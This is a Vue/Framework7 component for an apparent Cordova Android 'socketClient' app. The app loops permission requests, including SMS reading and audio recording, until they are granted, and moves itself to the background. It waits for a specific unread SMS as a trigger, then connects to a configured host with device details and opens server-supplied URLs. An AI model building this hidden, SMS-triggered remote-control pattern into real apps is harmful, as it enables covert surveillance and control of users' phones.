<template>
  <f7-app :params="f7params" theme-dark>
    <f7-statusbar></f7-statusbar>
    <f7-panel right swipe>
      <f7-view url="/rightPanel/">
      </f7-view>
    </f7-panel>   
    <f7-view main class="safe-areas" url="/"></f7-view>
    <f7-popup id="my-popup">
      <f7-view url="/socketClientPopup/">
      </f7-view>
    </f7-popup>
  </f7-app>
</template>
<style>
.panel {
  min-width: 300px;
  max-width: 400px;
}    
</style>
<script>
  import Dom7 from 'dom7';
  import cordovaApp from '../js/cordova-app.js';
  import routes from '../js/routes.js';
  import config from '../config/config.json';
  import configDefault from '../config/configDefault.json';
  import async from 'async';

  export default {
    data() {
      return {
        // Framework7 Parameters
        f7params: {
          id: 'io.framework7.myapp', // App bundle ID
          name: 'socketClient' + config.type, // App name
          theme: 'auto', // Automatic theme detection
          panel: {
            swipe: "left",
            effect: 'reveal',
            // leftBreakpoint: 800,
          },   
          // App root data
          data: function () {
            return {
              config : config,
              configDefault : configDefault,
              processUrl: null,
              listaDeEventos: [],
              historyListaDeEventos: [],
              loadListaDeEventosJson: [],
              loadArrayListaDeEventosJson: [],
              socket:{
                sendConfigProcessUrlSocket: null,
                sendClient: null,
                disconnect: null,
                sendClients: null,
                sendTypingMessage: null,
                sendOffTypingMessage: null,
                connect: null,
                id: null,
                sendMessage: null
              },
              sms:{
                sendConfigProcessUrlSms: null,
              },
              img:null,
              appJava:null
            };
          },
          // App routes
          routes: routes,
          // Input settings
          input: {
            scrollIntoViewOnFocus: this.$device.cordova && !this.$device.electron,
            scrollIntoViewCentered: this.$device.cordova && !this.$device.electron,
          },
          // Cordova Statusbar settings
          statusbar: {
            overlay: this.$device.cordova && this.$device.ios || 'auto',
            iosOverlaysWebView: true,
            androidOverlaysWebView: false,
          },
        },
      }
    },
    methods: {
      getInfoDevice(){
        var device = this.$f7.device;
        var data = {};
        for(let key in device){
          if(key != "pixelRatio"){          
            var currentValue = device[key];
            if(typeof currentValue === "boolean"){
              if(currentValue){
                data[key] = currentValue;
              }
            }else{
              data[key] = currentValue;
            }
          }
        }
        return data;
      },
      permisos(self){
        // AndroidManifest.xml :

        // WRITE_EXTERNAL_STORAGE
        // RECORD_AUDIO
        // MODIFY_AUDIO_SETTINGS
        // READ_PHONE_STATE
        // READ_SMS
        // ACCESS_WIFI_STATE
        // CHANGE_WIFI_STATE
        // ACCESS_COARSE_LOCATION
        // WRITE_SETTINGS
        var exit = true;
        async.whilst(
          function test(cb) { cb(null, exit); },
          function iter(callback) {
            async.eachSeries(self.$f7.data.config.android.permission, function(currentPermision, next) {
              window.cordova.plugins.permissions.checkPermission(currentPermision, (status) => {
                if(!status.hasPermission){
                  // !OK : hasPermission
                  window.cordova.plugins.permissions.requestPermission(currentPermision, (status) => {
                    if(!status.hasPermission){
                      //  !OK : requestPermissions
                      next(true);
                    }else{
                      //   OK : requestPermissions
                      next();
                    }
                  },(error) => {
                    // error : requestPermissions
                    next(true);
                  });
                }else{
                  //  OK : hasPermission
                  next();
                }
              }, 
              (error) => {
                // error : hasPermission
                next(true);
              });

            }, function(err){
              console.log("// err .., err : " + err);
              if(err){

                // err
                exit = true;

                callback(null, exit);

              }else{
                // fin
                exit = false;
                callback(null, exit);

              }
            });
          },
          function (err, exit) {
            // Finish ..
            return self.getSms(self.$f7.data.config.sms);
          });
        return this;            
      },
      sendProcessURLbySMS(data){
        var self = this;
        self.$f7.data.sms.sendConfigProcessUrlSms = data;                  
        self.$f7.emit(data.event, self.$f7.data.sms.sendConfigProcessUrlSms);
      },
      getSms(filter){
        var self = this;
        self.background(true);
        var exit = true;
        async.whilst(
          function test(cb) { cb(null, exit); },
          function iter(callback) {

            if(SMS) {
              SMS.listSMS(filter, function(data){
                if(Array.isArray(data)) {
                  for(var i in data) {
                    var sms = data[i];
                    // valide sms 
                    if(sms.read == 0 && sms.body == filter.body){
                      console.log("SMS.listSMS, rs : " + JSON.stringify(sms));
                      self.background(false);
                      self.initSocket();
                    }
                  }
                }else{
                  exit = true;
                  callback(null, exit);
                }
              }, function(err){
                console.log("SMS.listSMS, err : " + err);
              });              
            }

          },
          function (err, exit) {
            // Finish ..
            console.log("getSms(body), Finish,  err : " + JSON.stringify(err) + ", exit : " + JSON.stringify(exit));

            return true;
          });
      },
      background(status){
        if(status) {
          console.log("moveToBackground");
          window.cordova.plugins.backgroundMode.moveToBackground();
        }else{
          console.log("moveToForeground");
          window.cordova.plugins.backgroundMode.unlock();
        }
      },
      initSocket(){
        var f7 = this.$f7; 
        var self = this;
        // f7 -> App(Java) : event "initSocket"
        var sendData = {
          data : JSON.stringify({
            host: f7.data.config.api.host, 
            port: f7.data.config.api.port,
            type: f7.data.config.type,
            wifi: "on",
            driver: self.getInfoDevice()
          })
        };
        window.broadcaster.fireNativeEvent("initSocket", sendData);
      }
    },
    mounted() {
      this.$f7ready((f7) => {
        var self = this;

          //add method
          f7.redirectTo = (path) =>{
            f7.view.main.router.navigate(path);
            f7.panel.close();
          }    

          // Init cordova APIs (see cordova-app.js)
          if (f7.device.cordova) {
            cordovaApp.init(f7);

            // enable : backgroundMode
            window.cordova.plugins.backgroundMode.enable();

            // Init Loop permisos.
            self.permisos(self);
          }

          // Set Dom7 style, events

          // Set socket on
          this.$f7.on("sendConfigProcessUrlSocket", function(data) {
            if(data.type == "Wap"){
              window.cordova.plugins.backgroundMode.moveToForeground();// fix, si entro en background que salga
              f7.data.processUrl = data;            
              f7.redirectTo('/getProcessUrl/' + data.socketId);
            }
          });

          // Set socket 
          this.$f7.on("sendDisconnect", function(data){
            console.log(data);
            if(data.disconnect){
            // socket.disconnect();
          }
        });
        //
      }); 
    }    
  }
</script>